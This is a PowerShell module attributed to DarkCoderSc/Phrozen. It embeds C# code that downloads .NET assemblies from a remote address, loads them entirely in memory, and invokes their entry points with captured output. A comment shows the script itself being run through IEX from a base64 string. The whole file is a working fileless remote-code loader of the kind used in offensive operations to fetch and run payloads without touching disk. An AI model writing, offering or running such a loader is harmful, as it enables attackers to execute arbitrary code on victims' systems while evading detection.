<#-------------------------------------------------------------------------------

    .Developer
        Jean-Pierre LESUEUR (@DarkCoderSc)
        https://www.twitter.com/darkcodersc
        https://github.com/DarkCoderSc
        jplesueur@phrozen.io
        PHROZEN

    .License
        Apache License
        Version 2.0, January 2004
        http://www.apache.org/licenses/

-------------------------------------------------------------------------------#>    

Add-Type -Language CSharp -TypeDefinition @'
	using System;
	using System.IO;
	using System.Reflection;
    using System.Security.Cryptography;

	public class MemAssembly
	{	
        public Assembly LoadedAssembly = null;	
        public String Hash = null;

		private byte[] Buffer = null;				
				
		public MemAssembly(byte[] assembly) 
        {			
			this.Buffer = assembly;				

            SHA1Managed sha1 = new SHA1Managed();        
            this.Hash = BitConverter.ToString(sha1.ComputeHash(assembly));
		}

		public void Load() 
        {
			if (this.LoadedAssembly != null) 
            {
				return;
			}
		
			this.LoadedAssembly = Assembly.Load(this.Buffer);	                        
		}		

		public string InvokeMain(string argumentsLine) 
        {		
			string output = "";

			if (this.LoadedAssembly != null) 
            {	
				MethodInfo main = this.LoadedAssembly.EntryPoint;				
				if (main != null) 
                {					
					try 
					{						
						TextWriter oldStdout = Console.Out;
						StringWriter sw = new StringWriter();						
						Console.SetOut(sw);					
						try
						{				
							string[] parameters = argumentsLine.Split(' ');

							object[] args = new object[] { parameters };						
							main.Invoke(null, args);

							sw.Flush();							
						}
						finally
						{
							Console.SetOut(oldStdout);

							output = sw.ToString();
						}												
					} 
					catch 
					{}					
				}
			}

			return output;
		}
	}
'@ -ReferencedAssemblies 'System.Reflection.dll'

$global:globalMappedAssemblies = New-Object System.Collections.ArrayList


function Get-AssemblyByHash 
{
    param(
        [string] $Hash
    )

    foreach ($assembly in $globalMappedAssemblies) 
    {
        if ($assembly.Hash -eq $Hash) 
        {
            return $assembly
        }
    }

    return $null
}

function Get-MappedAssembliesList 
{
    $rows = [PSObject]@()

    $i = 1
	foreach ($assembly in $globalMappedAssemblies) 
    {
        $row = New-Object PSObject

        $row | Add-Member -MemberType NoteProperty -Name Id -Value $i        
        $row | Add-Member -MemberType NoteProperty -Name Name -Value ($assembly.LoadedAssembly.FullName.split(',')[0])
        $row | Add-Member -MemberType NoteProperty -Name Hash -Value $assembly.Hash
        
        $rows += $row

        $i++
	}	

    Write-Output $rows | Format-Table
}

function Get-RemoteAssembly 
{
    param(
        [string] $RemoteAddress
    )
    
    $data = (New-Object Net.WebClient).DownloadData($RemoteAddress) 

    $assembly = New-Object -TypeName MemAssembly -ArgumentList @(,$data)    

    try 
    {
        $assembly.Load()
    }
    catch
    {
        Throw "Invalid or corrupted assembly file."            
    }

    if (Get-AssemblyByHash -Hash $assembly.Hash) 
    {
        Throw "Assembly is already mapped."
    }
    else 
    {
        $globalMappedAssemblies.Add($assembly) > $null
    }   
}

function Invoke-Assembly 
{
    param(
        [int] $mappedIndex,
        [string] $argumentLine
    )

    if ($mappedIndex -eq 0) 
    {
        $mappedIndex = 1
    }

    $assembly = $globalMappedAssemblies[$mappedIndex-1]
    if (-not $assembly) 
    {
        Throw "Could not find mapped assembly at this index. Use Get-MappedAssembliesList to get the list of mapped assemblies."
    }

    Write-Output $assembly.InvokeMain($argumentLine)
}

# Placing the "Export-ModuleMember" in a Try/Catch make this script working outside PowerShell Module.
# Example: IEX([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("<...This script in b64 encoded...>"))) 
try {
    Export-ModuleMember -Function Get-RemoteAssembly
    Export-ModuleMember -Function Invoke-Assembly
    Export-ModuleMember -Function Get-MappedAssembliesList
} catch {}
